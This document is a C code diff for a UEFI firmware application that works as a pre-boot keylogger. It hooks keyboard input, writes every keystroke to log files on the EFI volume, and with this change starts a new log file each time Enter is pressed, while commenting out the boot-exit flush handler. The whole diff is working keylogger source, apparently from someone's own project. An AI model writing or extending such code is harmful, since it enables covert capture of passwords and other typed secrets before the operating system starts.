@@ -6,6 +6,42 @@ EFI_FILE_PROTOCOL *File;
 EFI_GUID gEfiSimpleTextInputExProtocolGuid = EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL_GUID;
 EFI_EVENT KeyEvent;
 EFI_EVENT mExitBootServicesEvent = NULL;
+EFI_STATUS Status;
+EFI_FILE_PROTOCOL *Root;
+UINTN FileCounter = 1;
+
+VOID reset_file()
+{
+    // this will use the *Root pointer
+    // it will open a new file each time, named for the instance of the count of files
+    // first, flush and close the current file
+    Status = uefi_call_wrapper(File->Flush, 1, File);
+    if (EFI_ERROR(Status))
+    {
+        Print(L"Error flushing current log file. Error code %d\n");
+    }
+
+    Status = uefi_call_wrapper(File->Close, 1, File);
+    if (EFI_ERROR(Status))
+    {
+        Print(L"Error closing current log file. Error code %d\n", Status);
+    }
+
+    // next, open a new file named log<number>.txt
+    CHAR16 buffer[128];
+    UnicodeSPrint(buffer, sizeof(buffer), L"\\log_%d.txt", FileCounter);
+    Status = uefi_call_wrapper(Root->Open, 5, Root, &File, buffer, EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
+
+    if (EFI_ERROR(Status))
+    {
+        Print(L"Error opening new log file. Error code %d\n", Status);
+    }
+
+    // iterate counter
+    FileCounter++;
+
+    // that should be all
+}
 
 
 UINTN AsciiStrLen (IN CONST CHAR8 *String)
@@ -45,6 +81,12 @@ EFI_STATUS EFIAPI key_notify_function(EFI_KEY_DATA *KeyData)
     }
     else
     {
+        // If we get `Enter`, we need to make a new log file
+        if (KeyData->Key.UnicodeChar == 0x000a) // line feed
+        {
+            reset_file();
+        }
+
         SPrint(buffer, 32, L"CHAR=%c\n", KeyData->Key.UnicodeChar);
     }
 
@@ -63,21 +105,30 @@ EFI_STATUS EFIAPI key_notify_function(EFI_KEY_DATA *KeyData)
 // we need to know when the OS is being booted
 // and save the key log to a file
 // otherwise, we might lose our record!
-VOID EFIAPI exit_boot_services (IN EFI_EVENT Event, IN VOID *Context)
-{
-    // this very simply just flushes and closes the file
-    // note that WE ARE NOT ALLOWED TO MODIFY MEMORY
-    // that means no addressing, freeing, etc.
-    // so basically we can't write to the file or declare variables or anything fancy like that.
-    uefi_call_wrapper(File->Flush, 1, File);
-
-    uefi_call_wrapper(File->Close, 1, File);
-}
+// VOID EFIAPI exit_boot_services (IN EFI_EVENT Event, IN VOID *Context)
+// {
+//     // this very simply just flushes and closes the file
+//     // note that WE ARE NOT ALLOWED TO MODIFY MEMORY
+//     // that means no addressing, freeing, etc.
+//     // so basically we can't write to the file or declare variables or anything fancy like that.
+//     Status = uefi_call_wrapper(File->Flush, 1, File);
+//     if(EFI_ERROR(Status))
+//     {
+//         Print(L"Error flushing the file! Error code %d", Status);
+//     }
+//
+//     Status = uefi_call_wrapper(File->Close, 1, File);
+//     if (EFI_ERROR(Status))
+//     {
+//         Print(L"Error closing the file! Error code %d", Status);
+//     }
+//
+// }
 
 EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
 {
     EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
-    EFI_STATUS Status;
+
     UINTN HandleCount;
     EFI_HANDLE *HandleBuffer;
     EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *KeyboardProtocol;
@@ -85,14 +136,14 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
     // Initialize the library
     InitializeLib(ImageHandle, SystemTable);
 
-    // create exit boot services event
-    Status = uefi_call_wrapper(BS->CreateEvent, 5,
-        EVT_SIGNAL_EXIT_BOOT_SERVICES, // type
-        TPL_NOTIFY,
-        exit_boot_services,            // function to call
-        NULL,                          // NotifyContext
-        &mExitBootServicesEvent        // event
-    );
+    // // create exit boot services event
+    // Status = uefi_call_wrapper(BS->CreateEvent, 5,
+    //     EVT_SIGNAL_EXIT_BOOT_SERVICES, // type
+    //     TPL_NOTIFY,
+    //     exit_boot_services,            // function to call
+    //     NULL,                          // NotifyContext
+    //     &mExitBootServicesEvent        // event
+    // );
 
     // Locate all handles that support the Simple File System Protocol
     Status = uefi_call_wrapper(BS->LocateHandleBuffer, 5, ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &HandleBuffer);
@@ -114,7 +165,6 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
     }
 
     // open the volume
-    EFI_FILE_PROTOCOL *Root;
     Status = uefi_call_wrapper(FileSystem->OpenVolume, 2, FileSystem, &Root);
     if (EFI_ERROR(Status)) {
         // Handle error
@@ -124,7 +174,7 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
 
     // open \hello.txt
 
-    Status = uefi_call_wrapper(Root->Open, 5, Root, &File, L"\\hello.txt", EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
+    Status = uefi_call_wrapper(Root->Open, 5, Root, &File, L"\\log0.txt", EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
     if (EFI_ERROR(Status)) {
         // Handle error
         Print(L"Error opening the file! %d\n", Status);
